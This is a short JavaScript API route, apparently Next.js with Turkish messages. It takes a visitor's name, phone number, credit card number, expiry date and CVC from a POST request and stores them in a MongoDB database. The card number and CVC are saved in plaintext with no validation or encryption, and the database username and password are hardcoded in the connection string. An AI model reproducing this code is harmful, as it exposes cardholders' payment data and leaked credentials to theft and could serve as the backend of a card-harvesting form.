import { MongoClient } from 'mongodb'

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).end() // Method Not Allowed
    return
  }

  const { name, surname, phone, cardNumber, expiry, cvc } = req.body

  try {
    const client = await MongoClient.connect(
      'mongodb+srv://jagshem:Do5u8Oakcad6AwRD@deneme.istfyfj.mongodb.net/test',
      {
        useNewUrlParser: true,
        useUnifiedTopology: true,
        serverSelectionTimeoutMS: 50000,
      }
    )

    const db = client.db('my_database')

    await db.collection('people').insertOne({ name, surname, phone })
    await db.collection('credit_cards').insertOne({ cardNumber, expiry, cvc })

    client.close()

    res.status(200).json({ message: 'Başarıyla kaydedildi' })
  } catch (error) {
    console.error(error)
    res.status(500).json({ message: 'Bir hata oluştu' })
  }
}
